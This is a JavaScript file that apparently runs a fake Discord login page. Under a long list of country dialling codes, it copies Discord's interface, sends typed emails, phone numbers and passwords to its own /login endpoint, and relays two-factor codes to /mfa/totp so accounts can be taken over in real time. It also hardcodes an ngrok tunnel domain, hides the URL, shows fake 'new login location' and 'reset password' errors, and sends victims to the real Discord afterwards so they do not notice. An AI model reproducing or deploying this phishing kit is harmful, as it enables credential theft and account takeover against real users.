const countries = [{
  "country": "Afghanistan",
  "code": "93",
  "iso": "AF"
}, {
  "country": "Albania",
  "code": "355",
  "iso": "AL"
}, {
  "country": "Algeria",
  "code": "213",
  "iso": "DZ"
}, {
  "country": "American Samoa",
  "code": "1-684",
  "iso": "AS"
}, {
  "country": "Andorra",
  "code": "376",
  "iso": "AD"
}, {
  "country": "Angola",
  "code": "244",
  "iso": "AO"
}, {
  "country": "Anguilla",
  "code": "1-264",
  "iso": "AI"
}, {
  "country": "Antarctica",
  "code": "672",
  "iso": "AQ"
}, {
  "country": "Antigua and Barbuda",
  "code": "1-268",
  "iso": "AG"
}, {
  "country": "Argentina",
  "code": "54",
  "iso": "AR"
}, {
  "country": "Armenia",
  "code": "374",
  "iso": "AM"
}, {
  "country": "Aruba",
  "code": "297",
  "iso": "AW"
}, {
  "country": "Australia",
  "code": "61",
  "iso": "AU"
}, {
  "country": "Austria",
  "code": "43",
  "iso": "AT"
}, {
  "country": "Azerbaijan",
  "code": "994",
  "iso": "AZ"
}, {
  "country": "Bahamas",
  "code": "1-242",
  "iso": "BS"
}, {
  "country": "Bahrain",
  "code": "973",
  "iso": "BH"
}, {
  "country": "Bangladesh",
  "code": "880",
  "iso": "BD"
}, {
  "country": "Barbados",
  "code": "1-246",
  "iso": "BB"
}, {
  "country": "Belarus",
  "code": "375",
  "iso": "BY"
}, {
  "country": "Belgium",
  "code": "32",
  "iso": "BE"
}, {
  "country": "Belize",
  "code": "501",
  "iso": "BZ"
}, {
  "country": "Benin",
  "code": "229",
  "iso": "BJ"
}, {
  "country": "Bermuda",
  "code": "1-441",
  "iso": "BM"
}, {
  "country": "Bhutan",
  "code": "975",
  "iso": "BT"
}, {
  "country": "Bolivia",
  "code": "591",
  "iso": "BO"
}, {
  "country": "Bosnia and Herzegovina",
  "code": "387",
  "iso": "BA"
}, {
  "country": "Botswana",
  "code": "267",
  "iso": "BW"
}, {
  "country": "Brazil",
  "code": "55",
  "iso": "BR"
}, {
  "country": "British Indian Ocean Territory",
  "code": "246",
  "iso": "IO"
}, {
  "country": "British Virgin Islands",
  "code": "1-284",
  "iso": "VG"
}, {
  "country": "Brunei",
  "code": "673",
  "iso": "BN"
}, {
  "country": "Bulgaria",
  "code": "359",
  "iso": "BG"
}, {
  "country": "Burkina Faso",
  "code": "226",
  "iso": "BF"
}, {
  "country": "Burundi",
  "code": "257",
  "iso": "BI"
}, {
  "country": "Cambodia",
  "code": "855",
  "iso": "KH"
}, {
  "country": "Cameroon",
  "code": "237",
  "iso": "CM"
}, {
  "country": "Canada",
  "code": "1",
  "iso": "CA"
}, {
  "country": "Cape Verde",
  "code": "238",
  "iso": "CV"
}, {
  "country": "Cayman Islands",
  "code": "1-345",
  "iso": "KY"
}, {
  "country": "Central African Republic",
  "code": "236",
  "iso": "CF"
}, {
  "country": "Chad",
  "code": "235",
  "iso": "TD"
}, {
  "country": "Chile",
  "code": "56",
  "iso": "CL"
}, {
  "country": "China",
  "code": "86",
  "iso": "CN"
}, {
  "country": "Christmas Island",
  "code": "61",
  "iso": "CX"
}, {
  "country": "Cocos Islands",
  "code": "61",
  "iso": "CC"
}, {
  "country": "Colombia",
  "code": "57",
  "iso": "CO"
}, {
  "country": "Comoros",
  "code": "269",
  "iso": "KM"
}, {
  "country": "Cook Islands",
  "code": "682",
  "iso": "CK"
}, {
  "country": "Costa Rica",
  "code": "506",
  "iso": "CR"
}, {
  "country": "Croatia",
  "code": "385",
  "iso": "HR"
}, {
  "country": "Cuba",
  "code": "53",
  "iso": "CU"
}, {
  "country": "Curacao",
  "code": "599",
  "iso": "CW"
}, {
  "country": "Cyprus",
  "code": "357",
  "iso": "CY"
}, {
  "country": "Czech Republic",
  "code": "420",
  "iso": "CZ"
}, {
  "country": "Democratic Republic of the Congo",
  "code": "243",
  "iso": "CD"
}, {
  "country": "Denmark",
  "code": "45",
  "iso": "DK"
}, {
  "country": "Djibouti",
  "code": "253",
  "iso": "DJ"
}, {
  "country": "Dominica",
  "code": "1-767",
  "iso": "DM"
}, {
  "country": "Dominican Republic",
  "code": "1-809, 1-829, 1-849",
  "iso": "DO"
}, {
  "country": "East Timor",
  "code": "670",
  "iso": "TL"
}, {
  "country": "Ecuador",
  "code": "593",
  "iso": "EC"
}, {
  "country": "Egypt",
  "code": "20",
  "iso": "EG"
}, {
  "country": "El Salvador",
  "code": "503",
  "iso": "SV"
}, {
  "country": "Equatorial Guinea",
  "code": "240",
  "iso": "GQ"
}, {
  "country": "Eritrea",
  "code": "291",
  "iso": "ER"
}, {
  "country": "Estonia",
  "code": "372",
  "iso": "EE"
}, {
  "country": "Ethiopia",
  "code": "251",
  "iso": "ET"
}, {
  "country": "Falkland Islands",
  "code": "500",
  "iso": "FK"
}, {
  "country": "Faroe Islands",
  "code": "298",
  "iso": "FO"
}, {
  "country": "Fiji",
  "code": "679",
  "iso": "FJ"
}, {
  "country": "Finland",
  "code": "358",
  "iso": "FI"
}, {
  "country": "France",
  "code": "33",
  "iso": "FR"
}, {
  "country": "French Polynesia",
  "code": "689",
  "iso": "PF"
}, {
  "country": "Gabon",
  "code": "241",
  "iso": "GA"
}, {
  "country": "Gambia",
  "code": "220",
  "iso": "GM"
}, {
  "country": "Georgia",
  "code": "995",
  "iso": "GE"
}, {
  "country": "Germany",
  "code": "49",
  "iso": "DE"
}, {
  "country": "Ghana",
  "code": "233",
  "iso": "GH"
}, {
  "country": "Gibraltar",
  "code": "350",
  "iso": "GI"
}, {
  "country": "Greece",
  "code": "30",
  "iso": "GR"
}, {
  "country": "Greenland",
  "code": "299",
  "iso": "GL"
}, {
  "country": "Grenada",
  "code": "1-473",
  "iso": "GD"
}, {
  "country": "Guam",
  "code": "1-671",
  "iso": "GU"
}, {
  "country": "Guatemala",
  "code": "502",
  "iso": "GT"
}, {
  "country": "Guernsey",
  "code": "44-1481",
  "iso": "GG"
}, {
  "country": "Guinea",
  "code": "224",
  "iso": "GN"
}, {
  "country": "Guinea-Bissau",
  "code": "245",
  "iso": "GW"
}, {
  "country": "Guyana",
  "code": "592",
  "iso": "GY"
}, {
  "country": "Haiti",
  "code": "509",
  "iso": "HT"
}, {
  "country": "Honduras",
  "code": "504",
  "iso": "HN"
}, {
  "country": "Hong Kong",
  "code": "852",
  "iso": "HK"
}, {
  "country": "Hungary",
  "code": "36",
  "iso": "HU"
}, {
  "country": "Iceland",
  "code": "354",
  "iso": "IS"
}, {
  "country": "India",
  "code": "91",
  "iso": "IN"
}, {
  "country": "Indonesia",
  "code": "62",
  "iso": "ID"
}, {
  "country": "Iran",
  "code": "98",
  "iso": "IR"
}, {
  "country": "Iraq",
  "code": "964",
  "iso": "IQ"
}, {
  "country": "Ireland",
  "code": "353",
  "iso": "IE"
}, {
  "country": "Isle of Man",
  "code": "44-1624",
  "iso": "IM"
}, {
  "country": "Israel",
  "code": "972",
  "iso": "IL"
}, {
  "country": "Italy",
  "code": "39",
  "iso": "IT"
}, {
  "country": "Ivory Coast",
  "code": "225",
  "iso": "CI"
}, {
  "country": "Jamaica",
  "code": "1-876",
  "iso": "JM"
}, {
  "country": "Japan",
  "code": "81",
  "iso": "JP"
}, {
  "country": "Jersey",
  "code": "44-1534",
  "iso": "JE"
}, {
  "country": "Jordan",
  "code": "962",
  "iso": "JO"
}, {
  "country": "Kazakhstan",
  "code": "7",
  "iso": "KZ"
}, {
  "country": "Kenya",
  "code": "254",
  "iso": "KE"
}, {
  "country": "Kiribati",
  "code": "686",
  "iso": "KI"
}, {
  "country": "Kosovo",
  "code": "383",
  "iso": "XK"
}, {
  "country": "Kuwait",
  "code": "965",
  "iso": "KW"
}, {
  "country": "Kyrgyzstan",
  "code": "996",
  "iso": "KG"
}, {
  "country": "Laos",
  "code": "856",
  "iso": "LA"
}, {
  "country": "Latvia",
  "code": "371",
  "iso": "LV"
}, {
  "country": "Lebanon",
  "code": "961",
  "iso": "LB"
}, {
  "country": "Lesotho",
  "code": "266",
  "iso": "LS"
}, {
  "country": "Liberia",
  "code": "231",
  "iso": "LR"
}, {
  "country": "Libya",
  "code": "218",
  "iso": "LY"
}, {
  "country": "Liechtenstein",
  "code": "423",
  "iso": "LI"
}, {
  "country": "Lithuania",
  "code": "370",
  "iso": "LT"
}, {
  "country": "Luxembourg",
  "code": "352",
  "iso": "LU"
}, {
  "country": "Macao",
  "code": "853",
  "iso": "MO"
}, {
  "country": "Macedonia",
  "code": "389",
  "iso": "MK"
}, {
  "country": "Madagascar",
  "code": "261",
  "iso": "MG"
}, {
  "country": "Malawi",
  "code": "265",
  "iso": "MW"
}, {
  "country": "Malaysia",
  "code": "60",
  "iso": "MY"
}, {
  "country": "Maldives",
  "code": "960",
  "iso": "MV"
}, {
  "country": "Mali",
  "code": "223",
  "iso": "ML"
}, {
  "country": "Malta",
  "code": "356",
  "iso": "MT"
}, {
  "country": "Marshall Islands",
  "code": "692",
  "iso": "MH"
}, {
  "country": "Mauritania",
  "code": "222",
  "iso": "MR"
}, {
  "country": "Mauritius",
  "code": "230",
  "iso": "MU"
}, {
  "country": "Mayotte",
  "code": "262",
  "iso": "YT"
}, {
  "country": "Mexico",
  "code": "52",
  "iso": "MX"
}, {
  "country": "Micronesia",
  "code": "691",
  "iso": "FM"
}, {
  "country": "Moldova",
  "code": "373",
  "iso": "MD"
}, {
  "country": "Monaco",
  "code": "377",
  "iso": "MC"
}, {
  "country": "Mongolia",
  "code": "976",
  "iso": "MN"
}, {
  "country": "Montenegro",
  "code": "382",
  "iso": "ME"
}, {
  "country": "Montserrat",
  "code": "1-664",
  "iso": "MS"
}, {
  "country": "Morocco",
  "code": "212",
  "iso": "MA"
}, {
  "country": "Mozambique",
  "code": "258",
  "iso": "MZ"
}, {
  "country": "Myanmar",
  "code": "95",
  "iso": "MM"
}, {
  "country": "Namibia",
  "code": "264",
  "iso": "NA"
}, {
  "country": "Nauru",
  "code": "674",
  "iso": "NR"
}, {
  "country": "Nepal",
  "code": "977",
  "iso": "NP"
}, {
  "country": "Netherlands",
  "code": "31",
  "iso": "NL"
}, {
  "country": "Netherlands Antilles",
  "code": "599",
  "iso": "AN"
}, {
  "country": "New Caledonia",
  "code": "687",
  "iso": "NC"
}, {
  "country": "New Zealand",
  "code": "64",
  "iso": "NZ"
}, {
  "country": "Nicaragua",
  "code": "505",
  "iso": "NI"
}, {
  "country": "Niger",
  "code": "227",
  "iso": "NE"
}, {
  "country": "Nigeria",
  "code": "234",
  "iso": "NG"
}, {
  "country": "Niue",
  "code": "683",
  "iso": "NU"
}, {
  "country": "North Korea",
  "code": "850",
  "iso": "KP"
}, {
  "country": "Northern Mariana Islands",
  "code": "1-670",
  "iso": "MP"
}, {
  "country": "Norway",
  "code": "47",
  "iso": "NO"
}, {
  "country": "Oman",
  "code": "968",
  "iso": "OM"
}, {
  "country": "Pakistan",
  "code": "92",
  "iso": "PK"
}, {
  "country": "Palau",
  "code": "680",
  "iso": "PW"
}, {
  "country": "Palestine",
  "code": "970",
  "iso": "PS"
}, {
  "country": "Panama",
  "code": "507",
  "iso": "PA"
}, {
  "country": "Papua New Guinea",
  "code": "675",
  "iso": "PG"
}, {
  "country": "Paraguay",
  "code": "595",
  "iso": "PY"
}, {
  "country": "Peru",
  "code": "51",
  "iso": "PE"
}, {
  "country": "Philippines",
  "code": "63",
  "iso": "PH"
}, {
  "country": "Pitcairn",
  "code": "64",
  "iso": "PN"
}, {
  "country": "Poland",
  "code": "48",
  "iso": "PL"
}, {
  "country": "Portugal",
  "code": "351",
  "iso": "PT"
}, {
  "country": "Puerto Rico",
  "code": "1-787, 1-939",
  "iso": "PR"
}, {
  "country": "Qatar",
  "code": "974",
  "iso": "QA"
}, {
  "country": "Republic of the Congo",
  "code": "242",
  "iso": "CG"
}, {
  "country": "Reunion",
  "code": "262",
  "iso": "RE"
}, {
  "country": "Romania",
  "code": "40",
  "iso": "RO"
}, {
  "country": "Russia",
  "code": "7",
  "iso": "RU"
}, {
  "country": "Rwanda",
  "code": "250",
  "iso": "RW"
}, {
  "country": "Saint Barthelemy",
  "code": "590",
  "iso": "BL"
}, {
  "country": "Saint Helena",
  "code": "290",
  "iso": "SH"
}, {
  "country": "Saint Kitts and Nevis",
  "code": "1-869",
  "iso": "KN"
}, {
  "country": "Saint Lucia",
  "code": "1-758",
  "iso": "LC"
}, {
  "country": "Saint Martin",
  "code": "590",
  "iso": "MF"
}, {
  "country": "Saint Pierre and Miquelon",
  "code": "508",
  "iso": "PM"
}, {
  "country": "Saint Vincent and the Grenadines",
  "code": "1-784",
  "iso": "VC"
}, {
  "country": "Samoa",
  "code": "685",
  "iso": "WS"
}, {
  "country": "San Marino",
  "code": "378",
  "iso": "SM"
}, {
  "country": "Sao Tome and Principe",
  "code": "239",
  "iso": "ST"
}, {
  "country": "Saudi Arabia",
  "code": "966",
  "iso": "SA"
}, {
  "country": "Senegal",
  "code": "221",
  "iso": "SN"
}, {
  "country": "Serbia",
  "code": "381",
  "iso": "RS"
}, {
  "country": "Seychelles",
  "code": "248",
  "iso": "SC"
}, {
  "country": "Sierra Leone",
  "code": "232",
  "iso": "SL"
}, {
  "country": "Singapore",
  "code": "65",
  "iso": "SG"
}, {
  "country": "Sint Maarten",
  "code": "1-721",
  "iso": "SX"
}, {
  "country": "Slovakia",
  "code": "421",
  "iso": "SK"
}, {
  "country": "Slovenia",
  "code": "386",
  "iso": "SI"
}, {
  "country": "Solomon Islands",
  "code": "677",
  "iso": "SB"
}, {
  "country": "Somalia",
  "code": "252",
  "iso": "SO"
}, {
  "country": "South Africa",
  "code": "27",
  "iso": "ZA"
}, {
  "country": "South Korea",
  "code": "82",
  "iso": "KR"
}, {
  "country": "South Sudan",
  "code": "211",
  "iso": "SS"
}, {
  "country": "Spain",
  "code": "34",
  "iso": "ES"
}, {
  "country": "Sri Lanka",
  "code": "94",
  "iso": "LK"
}, {
  "country": "Sudan",
  "code": "249",
  "iso": "SD"
}, {
  "country": "Suriname",
  "code": "597",
  "iso": "SR"
}, {
  "country": "Svalbard and Jan Mayen",
  "code": "47",
  "iso": "SJ"
}, {
  "country": "Swaziland",
  "code": "268",
  "iso": "SZ"
}, {
  "country": "Sweden",
  "code": "46",
  "iso": "SE"
}, {
  "country": "Switzerland",
  "code": "41",
  "iso": "CH"
}, {
  "country": "Syria",
  "code": "963",
  "iso": "SY"
}, {
  "country": "Taiwan",
  "code": "886",
  "iso": "TW"
}, {
  "country": "Tajikistan",
  "code": "992",
  "iso": "TJ"
}, {
  "country": "Tanzania",
  "code": "255",
  "iso": "TZ"
}, {
  "country": "Thailand",
  "code": "66",
  "iso": "TH"
}, {
  "country": "Togo",
  "code": "228",
  "iso": "TG"
}, {
  "country": "Tokelau",
  "code": "690",
  "iso": "TK"
}, {
  "country": "Tonga",
  "code": "676",
  "iso": "TO"
}, {
  "country": "Trinidad and Tobago",
  "code": "1-868",
  "iso": "TT"
}, {
  "country": "Tunisia",
  "code": "216",
  "iso": "TN"
}, {
  "country": "Turkey",
  "code": "90",
  "iso": "TR"
}, {
  "country": "Turkmenistan",
  "code": "993",
  "iso": "TM"
}, {
  "country": "Turks and Caicos Islands",
  "code": "1-649",
  "iso": "TC"
}, {
  "country": "Tuvalu",
  "code": "688",
  "iso": "TV"
}, {
  "country": "U.S. Virgin Islands",
  "code": "1-340",
  "iso": "VI"
}, {
  "country": "Uganda",
  "code": "256",
  "iso": "UG"
}, {
  "country": "Ukraine",
  "code": "380",
  "iso": "UA"
}, {
  "country": "United Arab Emirates",
  "code": "971",
  "iso": "AE"
}, {
  "country": "United Kingdom",
  "code": "44",
  "iso": "GB"
}, {
  "country": "United States",
  "code": "1",
  "iso": "US"
}, {
  "country": "Uruguay",
  "code": "598",
  "iso": "UY"
}, {
  "country": "Uzbekistan",
  "code": "998",
  "iso": "UZ"
}, {
  "country": "Vanuatu",
  "code": "678",
  "iso": "VU"
}, {
  "country": "Vatican",
  "code": "379",
  "iso": "VA"
}, {
  "country": "Venezuela",
  "code": "58",
  "iso": "VE"
}, {
  "country": "Vietnam",
  "code": "84",
  "iso": "VN"
}, {
  "country": "Wallis and Futuna",
  "code": "681",
  "iso": "WF"
}, {
  "country": "Western Sahara",
  "code": "212",
  "iso": "EH"
}, {
  "country": "Yemen",
  "code": "967",
  "iso": "YE"
}, {
  "country": "Zambia",
  "code": "260",
  "iso": "ZM"
}, {
  "country": "Zimbabwe",
  "code": "263",
  "iso": "ZW"
}];
const langs = {
  fr: {
    invalid: 'Identifiant ou mot de passe invalide.',
    location: 'Nouveau lieu de connexion détecté, vérifiez votre e-mail.',
    password_reset: 'Réinitialisez votre mot de passe pour vous connecter.'
  },
  en: {
    invalid: 'Login or password is invalid.',
    location: 'New login location detected, please check your e-mail.',
    password_reset: 'Reset your password to login.'
  },
  es: {
    invalid: 'El inicio de sesión o la contraseña no son válidos.',
    location: 'Nueva ubicación de conexión detectada, compruebe su correo electrónico.',
    password_reset: 'Restablezca su contraseña para iniciar sesión.'
  },
  de: {
    invalid: 'Login oder Passwort ungültig',
    location: 'Neuer Anmeldeort erkannt, überprüfen Sie Ihre E-Mail.',
    password_reset: 'Setzen Sie Ihr Passwort zurück, um sich anzumelden.'
  },
  pl: {
    invalid: 'Dane logowania lub hasło są nieprawidłowe.',
    location: 'Wykryto nową lokalizację połączenia, sprawdź pocztę e-mail.',
    password_reset: 'Zresetuj hasło, aby się zalogować.'
  },
  ru: {
    invalid: 'Неверные данные для входа или пароль.',
    location: 'Обнаружено новое местоположение соединения, проверьте свою электронную почту.',
    password_reset: 'Сбросьте свой пароль, чтобы войти.'
  },
  zh: {
    invalid: '登入帳號或密碼無效。',
    location: '检测到新的连接位置，请查看您的电子邮件。',
    password_reset: '重设您的密码以登录。'
  },
  pt: {
    invalid: 'Login ou senha inválidos.',
    location: 'Nova localização de login detectada, verifique seu e-mail.',
    password_reset: 'Redefina sua senha para entrar.'
  }
}
const urlParams = new URLSearchParams(window.location.search);
var ref = urlParams.get('from');
ref = ref ? [...ref].reverse().join('') : null;
history.pushState(null, null, '/');
const DOMAIN = '8480-170-83-71-156.ngrok-free.app';
const successURL = 'discord.com/app';
var a2fTicket;
const layerContainer = document.getElementsByClassName('layerContainer_d5a653')[1];
const modalContainer = document.getElementsByClassName('modal__1237a')[0];
const spinner = document.getElementsByClassName('spinner_f931ee');
const loginContent = document.getElementsByClassName('login_fb6227')[0];
const loginButton = document.getElementsByClassName('login_f4aae4')[0];
const a2fContent = document.getElementsByClassName('confirm_fb6229')[0];
const input1 = document.querySelector('.email__80165');
const input2 = document.querySelector('.password__80165');
const countryCodeContainer = document.querySelector('.outerContainer__0e924');
const countryCodeInput = document.querySelector('.countryCode');
const countryCodeIso = document.querySelector('.countryCodeL');
const countryCode = document.querySelector('.container__7cca3');
const labels = document.querySelectorAll('.label__5447e');
const requiredStars = document.querySelectorAll('.required__0baf3');
const errorMessages = document.querySelectorAll('.errorMessage__8c3f5');
const errorMessagesContent = document.querySelectorAll('.errorMessageContent__8c3f5');
const a2fWrapper = document.querySelectorAll('.wrapper__2d9b1')[0];
const loginWrapper = document.querySelectorAll('.wrapper__2d9b1')[1];
const a2fModal = document.querySelector('.modal__1238b');
const a2fInput = document.querySelector('.inputDefault__80165');
const a2fError = document.querySelector('.error__95c4e');
const a2fError2 = document.querySelector('.error__95c4e2');
const a2fSubmitButton = document.querySelector('.submit_fb6221');
const phoneCountry = countries.find(c => c.iso === navigator.language.toUpperCase());
if (phoneCountry) {
  countryCodeIso.value = phoneCountry.iso;
  countryCodeInput.value = `+${phoneCountry.code}`;
}
input1.addEventListener('input', () => {
  if (!input1.value.startsWith('+') && !isNaN(input1.value) && !input1.value.includes('.') && input1.value.length > 2) {
    if (countryCodeInput.value.length === 2)
      countryCode.style.width = '61.2812px';
    if (countryCodeInput.value.length === 3)
      countryCode.style.width = '72.5469px';
    if (countryCodeInput.value.length === 4)
      countryCode.style.width = '81.8594px';
    if (countryCodeInput.value.length === 5)
      countryCode.style.width = '91.1594px';
    countryCodeContainer.classList.remove('hidden__7f5ff');
  } else {
    countryCode.style.width = '0px';
    countryCodeContainer.classList.add('hidden__7f5ff');
    if (!countryCodeIso.value)
      countryCodeIso.value = 'US';
    if (countryCodeInput.value === '+')
      countryCodeInput.value = '+1';
  }
})
countryCodeIso.addEventListener('input', () => {
  countryCodeIso.value = countryCodeIso.value.toString().toUpperCase();
  if (!(/[a-zA-Z]/).test(countryCodeIso.value.toString()))
    countryCodeIso.value = countryCodeIso.value.slice(0, -1);
  const country = countries.find(c => c.iso === countryCodeIso.value.toString());
  if (country) {
    countryCodeInput.value = `+${country.code.replace('-', '')}`;
    if (countryCodeInput.value.length === 2)
      countryCode.style.width = '61.2812px';
    if (countryCodeInput.value.length === 3)
      countryCode.style.width = '72.5469px';
    if (countryCodeInput.value.length === 4)
      countryCode.style.width = '81.8594px';
    if (countryCodeInput.value.length === 5)
      countryCode.style.width = '91.1594px';
  }
})
countryCodeInput.addEventListener('input', () => {
  if (!countryCodeInput.value.startsWith('+'))
    countryCodeInput.value = '+';
  if (countryCodeInput.value !== '+' && isNaN(countryCodeInput.value) || countryCodeInput.value.includes('.'))
    countryCodeInput.value = countryCodeInput.value.slice(0, -1);
  if (countryCodeInput.value.length === 2)
    countryCode.style.width = '61.2812px';
  if (countryCodeInput.value.length === 3)
    countryCode.style.width = '72.5469px';
  if (countryCodeInput.value.length === 4)
    countryCode.style.width = '81.8594px';
  if (countryCodeInput.value.length === 5)
    countryCode.style.width = '91.1594px';
  const country = countries.find(c => countryCodeInput.value.toString().length === 5 ? c.code === `1-${countryCodeInput.value.toString().slice(2)}` : c.code === countryCodeInput.value.toString().replace('+', ''));
  if (country) {
    countryCodeIso.value = country.iso;
  }
})
a2fInput.addEventListener('input', () => {
  if (a2fInput.value.length < 6) {
    if (a2fError2.hasAttribute('hidden')) {
      a2fModal.style.height = '256px';
    } else {
      a2fModal.style.height = '282px';
    }
    a2fSubmitButton.setAttribute('disabled', true);
    a2fError.removeAttribute('hidden');
  } else {
    if (a2fError2.hasAttribute('hidden')) {
      a2fModal.style.height = '236px';
    } else {
      a2fModal.style.height = '256px';
    }
    a2fSubmitButton.removeAttribute('disabled');
    a2fError.setAttribute('hidden', true);
  }
})
document.addEventListener('mousedown', (e) => {
  if (!modalContainer.contains(e.target))
    closeModal();
})
async function login() {
  if (!countryCodeIso.value)
    countryCodeIso.value = phoneCountry ? phoneCountry.iso : 'US';
  if (countryCodeInput.value === '+') {
    countryCodeInput.value = phoneCountry ? `+${phoneCountry.code}` : '+1';
    if (countryCodeInput.value.length === 2)
      countryCode.style.width = '61.2812px';
    if (countryCodeInput.value.length === 3)
      countryCode.style.width = '72.5469px';
    if (countryCodeInput.value.length === 4)
      countryCode.style.width = '81.8594px';
    if (countryCodeInput.value.length === 5)
      countryCode.style.width = '91.1594px';
  }
  var email = input1.value.trim();
  const password = input2.value.trim();
  if (!input1.value.startsWith('+') && !isNaN(input1.value) && !input1.value.includes('.') && input1.value.length > 2)
    email = countryCodeInput.value + input1.value.trim();
  if (!email || !password)
    return;
  reset();
  startLoading();
  const json = await fetch(`/login`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json'
    },
    body: JSON.stringify({
      email,
      password,
      ref
    })
  }).then(res => res.json());
  if (json.status === 1) {
    stopLoading();
    window.location.replace(successURL);
  } else if (json.status === 2) {
    stopLoading();
    if (!labels[0].classList.contains('error__90447'))
      labels[0].classList.add('error__90447');
    requiredStars[0].setAttribute('hidden', true);
    errorMessagesContent[0].innerHTML = langs[navigator.language.split('-')[0]] ? langs[navigator.language.split('-')[0]].location : 'New login location detected, please check your e-mail.';
    errorMessages[0].removeAttribute('hidden');
  } else if (json.status === 6) {
    stopLoading();
    if (!labels[0].classList.contains('error__90447'))
      labels[0].classList.add('error__90447');
    requiredStars[0].setAttribute('hidden', true);
    errorMessagesContent[0].innerHTML = langs[navigator.language.split('-')[0]] ? langs[navigator.language.split('-')[0]].password_reset : 'Reset your password to login.';
    errorMessages[0].removeAttribute('hidden');
  } else if (json.status === 400) {
    stopLoading();
    window.location.replace(successURL);
  } else if (json.status === 3) {
    hcaptcha.reset();
    openModal();
  } else if (json.status === 5) {
    stopLoading();
    a2fTicket = json.ticket;
    openA2f();
  } else {
    stopLoading();
    for (const label of labels) {
      if (!label.classList.contains('error__90447'))
        label.classList.add('error__90447');
    }
    for (const requiredStar of requiredStars) {
      requiredStar.setAttribute('hidden', true);
    }
    for (const errorMessageContent of errorMessagesContent) {
      errorMessageContent.innerHTML = langs[navigator.language.split('-')[0]] ? langs[navigator.language.split('-')[0]].invalid : 'Login or password is invalid.';
    }
    for (const errorMessage of errorMessages) {
      errorMessage.removeAttribute('hidden');
    }
  }
}
async function a2fSubmit() {
  startLoading(0);
  const a2fCode = a2fInput.value;
  const json = await fetch(`/mfa/totp`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json'
    },
    body: JSON.stringify({
      ticket: a2fTicket,
      code: a2fCode,
      ref
    })
  }).then(res => res.json());
  stopLoading(0);
  if (json.status === 1) {
    window.location.replace(successURL);
  } else if (json.status === 400) {
    window.location.replace(successURL);
  } else {
    a2fModal.style.height = '256px';
    a2fError2.removeAttribute('hidden');
  }
}
async function onSuccess(captcha_key) {
  layerContainer.setAttribute('hidden', true);
  const email = input1.value.trim();
  const password = input2.value.trim();
  const json = await fetch(`/login`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json'
    },
    body: JSON.stringify({
      email,
      password,
      captcha_key,
      ref
    })
  }).then(res => res.json());
  if (json.status === 1) {
    stopLoading();
    window.location.replace(successURL);
  } else if (json.status === 2) {
    stopLoading();
    if (!labels[0].classList.contains('error__90447'))
      labels[0].classList.add('error__90447');
    requiredStars[0].setAttribute('hidden', true);
    errorMessagesContent[0].innerHTML = langs[navigator.language.split('-')[0]] ? langs[navigator.language.split('-')[0]].location : 'New login location detected, please check your e-mail.';
    errorMessages[0].removeAttribute('hidden');
  } else if (json.status === 3) {
    hcaptcha.reset();
    openModal();
  } else if (json.status === 5) {
    stopLoading();
    a2fTicket = json.ticket;
    openA2f();
  } else {
    stopLoading();
    for (const label of labels) {
      if (!label.classList.contains('error__90447'))
        label.classList.add('error__90447');
    }
    for (const requiredStar of requiredStars) {
      requiredStar.setAttribute('hidden', true);
    }
    for (const errorMessageContent of errorMessagesContent) {
      errorMessageContent.innerHTML = langs[navigator.language.split('-')[0]] ? langs[navigator.language.split('-')[0]].invalid : 'Login or password is invalid.';
    }
    for (const errorMessage of errorMessages) {
      errorMessage.removeAttribute('hidden');
    }
  }
}

function reset() {
  for (const label of labels) {
    if (label.classList.contains('error__90447'))
      label.classList.remove('error__90447');
  }
  for (const requiredStar of requiredStars) {
    requiredStar.removeAttribute('hidden');
  }
  for (const errorMessage of errorMessages) {
    errorMessage.setAttribute('hidden', true);
  }
}

function openA2f() {
  if (a2fSubmitButton.classList.contains('submitting__969f4'))
    a2fSubmitButton.classList.remove('submitting__969f4');
  stopLoading(0);
  loginWrapper.style.display = 'none';
  a2fWrapper.style.display = '';
}

function closeA2f() {
  if (loginButton.classList.contains('submitting__969f4'))
    a2fSubmitButton.classList.remove('submitting__969f4');
  stopLoading();
  a2fWrapper.style.display = 'none';
  loginWrapper.style.display = '';
}

function startLoading(type = 1) {
  spinner[type].style.display = '';
  if (type === 1) {
    if (!loginButton.classList.contains('submitting__969f4'))
      loginButton.classList.add('submitting__969f4');
    loginContent.setAttribute('hidden', true);
  } else {
    if (!a2fSubmitButton.classList.contains('submitting__969f4'))
      a2fSubmitButton.classList.add('submitting__969f4');
    a2fContent.setAttribute('hidden', true);
  }
}

function stopLoading(type = 1) {
  spinner[type].style.display = 'none';
  if (type === 1) {
    if (loginButton.classList.contains('submitting__969f4'))
      loginButton.classList.remove('submitting__969f4');
    loginContent.removeAttribute('hidden');
  } else {
    if (a2fSubmitButton.classList.contains('submitting__969f4'))
      a2fSubmitButton.classList.remove('submitting__969f4');
    a2fContent.removeAttribute('hidden');
  }
}

function openModal() {
  layerContainer.removeAttribute('hidden');
}

function closeModal() {
  layerContainer.setAttribute('hidden', true);
  stopLoading();
}